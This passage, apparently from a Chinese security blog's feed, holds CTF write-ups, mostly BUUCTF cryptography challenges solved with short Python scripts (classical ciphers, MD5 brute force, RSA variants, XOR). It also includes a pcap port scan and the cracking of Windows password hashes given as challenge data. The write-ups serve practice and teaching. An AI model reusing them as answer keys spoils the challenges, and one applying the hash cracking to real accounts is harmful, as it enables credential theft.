公开赛]拉胯的三条命令"></a>[V&amp;N2020 公开赛]拉胯的三条命令</h3><p>直接tcpdump</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ /usr/sbin/tcpdump  -n -r nmapll.pcapng <span class="string">&#x27;tcp[13] = 18&#x27;</span> |  awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span>| sort -u</span><br><span class="line">reading <span class="keyword">from</span> file nmapll.pcapng, link-type EN10MB (Ethernet)</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.21</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.22</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.3306</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.631</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="number">.801</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF-杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Crypto刷题1</title>
      <link href="2019/05/26/CTF-Crypto%E5%88%B7%E9%A2%981/"/>
      <url>2019/05/26/CTF-Crypto%E5%88%B7%E9%A2%981/</url>
      
        <content type="html"><![CDATA[<h1 id="BUUCTF-Crypto"><a href="#BUUCTF-Crypto" class="headerlink" title="BUUCTF-Crypto"></a>BUUCTF-Crypto</h1><p>MD5</p><p>直接解密得到admin1</p><p>url编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%66%6c%61%67%7b%61%6e%64%20%31%3d%31%7d</span><br></pre></td></tr></table></figure><p>解码得到flag</p><p>一眼就解密</p><p>下面的字符串解密后便能获得flag：ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30= 注意：得到的 flag 请包上 flag{} 提交</p><p>base64解码</p><p>看我回旋踢</p><p>synt{5pq1004q-86n5-46q8-o720-oro5on0417r1}</p><p>rot13、凯撒尝试尝试一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">steady_dic=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">steady_dic1=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">print(steady_dic1)</span><br><span class="line">steady_str=<span class="string">&quot;synt&#123;5pq1004q-86n5-46q8-o720-oro5on0417r1&#125;&quot;</span></span><br><span class="line">steady_flag=<span class="string">&quot;&quot;</span></span><br><span class="line">steady_num=<span class="number">13</span></span><br><span class="line">num=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> steady_str:</span><br><span class="line">    <span class="keyword">if</span> ord(<span class="string">&#x27;a&#x27;</span>) &lt;= ord(i) <span class="keyword">and</span> ord(i) &lt;= ord(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        num=steady_dic1.index(i)+<span class="number">1</span>+steady_num</span><br><span class="line">        <span class="keyword">if</span> num &gt; <span class="number">26</span>:</span><br><span class="line">            num=num%<span class="number">26</span></span><br><span class="line">        print(num)</span><br><span class="line">        steady_flag+=steady_dic1[num<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">elif</span> ord(<span class="string">&#x27;A&#x27;</span>) &lt;= ord(i) <span class="keyword">and</span> ord(i) &lt;= ord(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">        num=steady_dic.index(i)+<span class="number">1</span>+steady_num</span><br><span class="line">        <span class="keyword">if</span> num &gt; <span class="number">26</span>:</span><br><span class="line">            num=num%<span class="number">26</span></span><br><span class="line">        print(num)</span><br><span class="line">        steady_flag+=steady_dic[num<span class="number">-1</span>]   </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        steady_flag+=i</span><br><span class="line">print(steady_flag)</span><br></pre></td></tr></table></figure><h2 id="BJDCTF-2nd-签到-y1ng"><a href="#BJDCTF-2nd-签到-y1ng" class="headerlink" title="[BJDCTF 2nd]签到-y1ng"></a>[BJDCTF 2nd]签到-y1ng</h2><p>welcome to BJDCTF<br>1079822948</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QkpEe1czbGMwbWVfVDBfQkpEQ1RGfQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>base64编码</p><h2 id="password"><a href="#password" class="headerlink" title="password"></a>password</h2><p>姓名：张三<br>生日：19900315</p><p>key格式为key{xxxxxxxxxx}</p><h2 id="变异凯撒"><a href="#变异凯撒" class="headerlink" title="变异凯撒"></a>变异凯撒</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afZ_r9VYfScOeO_UL^RWUc</span><br></pre></td></tr></table></figure><p>每一个字符的唯一不一样，第一个位移为5，依次加一。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">steady_str=<span class="string">&quot;afZ_r9VYfScOeO_UL^RWUc&quot;</span></span><br><span class="line">start=<span class="number">5</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(steady_str)):</span><br><span class="line">    print(steady_str[i])</span><br><span class="line">    flag+=chr(ord(steady_str[i])+start)</span><br><span class="line">    start+=<span class="number">1</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="Quoted-printable"><a href="#Quoted-printable" class="headerlink" title="Quoted-printable"></a>Quoted-printable</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;E9&#x3D;82&#x3D;A3&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E4&#x3D;B9&#x3D;9F&#x3D;E5&#x3D;BE&#x3D;88&#x3D;E6&#x3D;A3&#x3D;92&#x3D;E5&#x3D;93&#x3D;A6</span><br></pre></td></tr></table></figure><p>直接解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">那你也很棒哦</span><br></pre></td></tr></table></figure><h2 id="Rabbit"><a href="#Rabbit" class="headerlink" title="Rabbit"></a>Rabbit</h2><p>Rabbit解密，有些时候需要密钥。此编码与和base64很相似。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1&#x2F;+ydnDPowGbjjJXhZxm2MP2AgI</span><br></pre></td></tr></table></figure><h2 id="篱笆墙的影子"><a href="#篱笆墙的影子" class="headerlink" title="篱笆墙的影子"></a>篱笆墙的影子</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">felhaagv&#123;ewtehtehfilnakgw&#125;</span><br></pre></td></tr></table></figure><p>篱笆==栅栏</p><h2 id="丢失的md5"><a href="#丢失的md5" class="headerlink" title="丢失的md5"></a>丢失的md5</h2><p>直接跑出md5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib   </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            m=hashlib.md5()</span><br><span class="line">            m.update(<span class="string">&#x27;TASC&#x27;</span>+chr(i)+<span class="string">&#x27;O3RJMV&#x27;</span>+chr(j)+<span class="string">&#x27;WDJKX&#x27;</span>+chr(k)+<span class="string">&#x27;ZM&#x27;</span>)</span><br><span class="line">            des=m.hexdigest()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;e9032&#x27;</span> <span class="keyword">in</span> des <span class="keyword">and</span> <span class="string">&#x27;da&#x27;</span> <span class="keyword">in</span> des <span class="keyword">and</span> <span class="string">&#x27;911513&#x27;</span> <span class="keyword">in</span> des:</span><br><span class="line">                <span class="keyword">print</span> des</span><br></pre></td></tr></table></figure><h2 id="Alice与Bob"><a href="#Alice与Bob" class="headerlink" title="Alice与Bob"></a>Alice与Bob</h2><p>分解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> factordb.factordb <span class="keyword">import</span> FactorDB</span><br><span class="line">N=<span class="number">98554799767</span></span><br><span class="line">factor=FactorDB(N)</span><br><span class="line">factor.connect()</span><br><span class="line">factor_list=factor.get_factor_list()</span><br><span class="line">print(factor_list)</span><br></pre></td></tr></table></figure><p>进行md5加密。</p><h2 id="rsarsa"><a href="#rsarsa" class="headerlink" title="rsarsa"></a>rsarsa</h2><p>常规脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">p =  <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q =  <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">c =  <span class="number">83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span></span><br><span class="line">n=q*p</span><br><span class="line">phin = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e, phin)</span><br><span class="line">m=pow(int(c),d,n)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>直接求d</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">p &#x3D;  473398607161</span><br><span class="line">q &#x3D;  4511491</span><br><span class="line">e &#x3D;  17</span><br><span class="line">c &#x3D;  83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span><br><span class="line">n&#x3D;q*p</span><br><span class="line">phin &#x3D; (p - 1) * (q - 1)</span><br><span class="line">d&#x3D;gmpy2.invert(e, phin)</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><h2 id="大帝的密码武器"><a href="#大帝的密码武器" class="headerlink" title="大帝的密码武器"></a>大帝的密码武器</h2><p>公元前一百年，在罗马出生了一位对世界影响巨大的人物，他生前是罗马三巨头之一。他率先使用了一种简单的加密函，因此这种加密方法以他的名字命名。<br>以下密文被解开后可以获得一个有意义的单词：FRPHEVGL<br>你可以用这个相同的加密向量加密附件中的密文，作为答案进行提交。</p><p>ComeChina</p><h2 id="Windows系统密码"><a href="#Windows系统密码" class="headerlink" title="Windows系统密码"></a>Windows系统密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">ctf:1002:06af9108f2e1fecf144e2e8adef09efd:a7fcb22a88038f35a8f39d503e7f0062:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:bef14eee40dffbc345eeb3f58e290d56:::</span><br></pre></td></tr></table></figure><p><code>a7fcb22a88038f35a8f39d503e7f0062</code>md5解密。</p><h2 id="燕言燕语"><a href="#燕言燕语" class="headerlink" title="燕言燕语"></a>燕言燕语</h2><p>十六进制解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex_to_str</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s = input(<span class="string">&quot;输入要转成字符串的16进制(输入空字符串退出)：&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s==<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        k=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">2</span>):</span><br><span class="line">                j = s[i]+s[i+<span class="number">1</span>]</span><br><span class="line">                k+=chr(int(j,<span class="number">16</span>))</span><br><span class="line">                print(k)</span><br><span class="line">        <span class="keyword">except</span>  Exception <span class="keyword">as</span> err:</span><br><span class="line">            print(<span class="string">&quot;输入有误：&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            print(err)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s = input(<span class="string">&quot;输入要转成16进制的字符串(输入空字符串退出)：&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s==<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        k=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            k+=str(hex(ord(i)))</span><br><span class="line">        k= k.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(k)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">     print(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">*****************************************</span></span><br><span class="line"><span class="string">*             1.字符串转16进制                          *</span></span><br><span class="line"><span class="string">*             2.16进制转字符串                         *</span></span><br><span class="line"><span class="string">*****************************************</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">     <span class="keyword">while</span> <span class="literal">True</span>:     </span><br><span class="line">        k = input(<span class="string">&quot;请输入要使用功能的序号：&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> k==<span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            str_to_hex()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> k==<span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            hex_to_str()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;输入有误请重新输入！！！&quot;</span>)</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">        main()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yanzi ZJQ&#123;xilzv_iqssuhoc_suzjg&#125; </span><br></pre></td></tr></table></figure><p>发现flag不对，前面有一个yanzi，应该是个密钥，尝试维吉尼亚解密。</p><h2 id="传统知识-古典密码"><a href="#传统知识-古典密码" class="headerlink" title="传统知识+古典密码"></a>传统知识+古典密码</h2><p>根据甲子表，拿到对应的ascii<code>XZSDMFLZ</code>，然后栅栏，拿到四栅栅栏，进行凯撒解密，拿到flag。</p><h2 id="GKCTF2020-小学生的密码学"><a href="#GKCTF2020-小学生的密码学" class="headerlink" title="[GKCTF2020]小学生的密码学"></a>[GKCTF2020]小学生的密码学</h2><p>e(x)=11x+6(mod26) 密文：welcylk </p><p>flag为base64形式</p><p>仿设加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string  <span class="comment">#affine</span></span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line">s = <span class="string">&#x27;welcylk&#x27;</span></span><br><span class="line">s1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">len =len(s)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len):</span><br><span class="line">    a=(<span class="number">19</span>*(ord(s[i])<span class="number">-97</span><span class="number">-6</span>))%<span class="number">26</span></span><br><span class="line">    s1+=chr(a+<span class="number">97</span>)</span><br><span class="line">print(base64.b64encode(s1))</span><br></pre></td></tr></table></figure><h2 id="RSA1"><a href="#RSA1" class="headerlink" title="RSA1"></a>RSA1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes  </span><br><span class="line">  </span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span>  </span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span>  </span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span>  </span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span>   </span><br><span class="line">  </span><br><span class="line">InvQ=gmpy2.invert(q,p)  </span><br><span class="line">mp=pow(c,dp,p)  </span><br><span class="line">mq=pow(c,dq,q)  </span><br><span class="line">m=(((mp-mq)*InvQ)%p)*q+mq  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)  </span><br></pre></td></tr></table></figure><h2 id="权限获得第一步"><a href="#权限获得第一步" class="headerlink" title="权限获得第一步"></a>权限获得第一步</h2><p><code>Administrator:806EDC27AA52E314AAD3B435B51404EE:F4AD50F57683D4260DFD48AA351A17A8:1</code></p><p>windows密码，倒数第二个数值是密码，尝试md5解密。</p><h2 id="萌萌哒的八戒"><a href="#萌萌哒的八戒" class="headerlink" title="萌萌哒的八戒"></a>萌萌哒的八戒</h2><p>提示八戒，一看就是猪圈密码。</p><h2 id="RSA3"><a href="#RSA3" class="headerlink" title="RSA3"></a>RSA3</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n = <span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">11187289</span></span><br><span class="line">e2 = <span class="number">9647291</span></span><br><span class="line">s = gcdext(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = -s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">c2 = <span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line">c2 = invert(c2, n)</span><br><span class="line">m = (pow(c1,s1,n) * pow(c2 , s2 , n)) % n</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(m)</span><br></pre></td></tr></table></figure><h2 id="异性相吸"><a href="#异性相吸" class="headerlink" title="异性相吸"></a>异性相吸</h2><p>异或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">steady_str&#x3D;&quot;asadsasdasdasdasdasdasdasdasdasdqwesqf&quot;</span><br><span class="line">f&#x3D;open(&quot;&#x2F;Users&#x2F;apple&#x2F;Downloads&#x2F;1&#x2F;密文.txt&quot;,&quot;r&quot;).read()</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(0,len(steady_str)):</span><br><span class="line">    flag+&#x3D;chr(ord(steady_str[i])^ord(f[i]))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="RSA-1"><a href="#RSA-1" class="headerlink" title="RSA"></a>RSA</h2><p>拿到public.key，使用openssl</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">OpenSSL&gt; rsa -pubin -text -modulus -in &#x2F;Users&#x2F;apple&#x2F;Downloads&#x2F;0eaf8d6c-3fe5-4549-9e81-94ac42535e7b&#x2F;pub.key</span><br><span class="line">Public-Key: (256 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    00:c0:33:2c:5c:64:ae:47:18:2f:6c:1c:87:6d:42:</span><br><span class="line">    33:69:10:54:5a:58:f7:ee:fe:fc:0b:ca:af:5a:f3:</span><br><span class="line">    41:cc:dd</span><br><span class="line">Exponent: 65537 (0x10001)</span><br><span class="line">Modulus&#x3D;C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMAzLFxkrkcYL2wch21CM2kQVFpY9+7+</span><br><span class="line">&#x2F;AvKr1rzQczdAgMBAAE&#x3D;</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>e=65537</p><p>n=C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes  </span><br><span class="line"> </span><br><span class="line">n = <span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span>  </span><br><span class="line">p = <span class="number">285960468890451637935629440372639283459</span>  </span><br><span class="line">q = <span class="number">304008741604601924494328155975272418463</span></span><br><span class="line">e = <span class="number">65537</span>  </span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)  </span><br><span class="line">d = libnum.invmod(e,phi)  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;/Users/apple/Desktop/flag.enc&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    c = f.read().encode(<span class="string">&#x27;hex&#x27;</span>)  </span><br><span class="line">    c = int(c,<span class="number">16</span>)  </span><br><span class="line">m = pow(c,d,n)  </span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure><h2 id="GKCTF2020-汉字的秘密"><a href="#GKCTF2020-汉字的秘密" class="headerlink" title="GKCTF2020]汉字的秘密"></a>GKCTF2020]汉字的秘密</h2><p>当铺密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&#x27;田口由中人工大土士王夫井羊壮&#x27;</span></span><br><span class="line">y = <span class="string">&#x27;00123455567899&#x27;</span></span><br><span class="line">z = <span class="string">&#x27;王壮 夫工 王中 王夫 由由井 井人 夫中 